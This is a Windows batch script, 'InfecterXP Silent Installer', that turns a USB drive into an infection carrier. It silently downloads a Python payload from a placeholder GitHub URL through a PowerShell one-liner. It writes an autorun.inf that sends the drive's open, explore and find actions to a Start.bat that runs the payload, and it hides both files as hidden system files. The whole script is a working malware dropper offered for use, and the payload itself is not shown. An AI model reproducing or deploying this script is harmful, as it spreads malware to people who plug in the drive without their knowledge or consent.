@echo off
:: InfecterXP Silent Installer v3.1
:: Automates environment setup on target systems

title InfecterXP Installer
color 0A
setlocal enabledelayedexpansion

:: Check USB drive
set "USB_DRIVE=%~d0"
if not exist "%USB_DRIVE%\InfecterXP" mkdir "%USB_DRIVE%\InfecterXP"

:: Download core files silently
echo [*] Downloading components...
powershell -nop -c "
$ProgressPreference='SilentlyContinue';
Invoke-WebRequest 'https://raw.githubusercontent.com/yourrepo/InfecterXP/main/core.py' -OutFile '%USB_DRIVE%\InfecterXP\infecterxp.py';
Invoke-WebRequest 'https://raw.githubusercontent.com/yourrepo/InfecterXP/main/icon.ico' -OutFile '%USB_DRIVE%\InfecterXP\icon.ico';
"

:: Create autorun.inf
echo [*] Configuring autorun...
(
echo [AutoRun]
echo shell\open\command=Start.bat
echo shell\explore\command=Start.bat
echo shell\find\command=Start.bat
) > "%USB_DRIVE%\autorun.inf"

:: Create Start.bat launcher
echo [*] Creating launcher...
(
echo @echo off
echo setlocal
echo cd /d "%%~dp0InfecterXP"
echo python -c "import os; os.system('python infecterxp.py')"
echo exit
) > "%USB_DRIVE%\Start.bat"

:: Hide files
attrib +h +s "%USB_DRIVE%\autorun.inf"
attrib +h +s "%USB_DRIVE%\InfecterXP"

echo [+] Setup completed successfully
timeout /t 3 /nobreak >nul
exit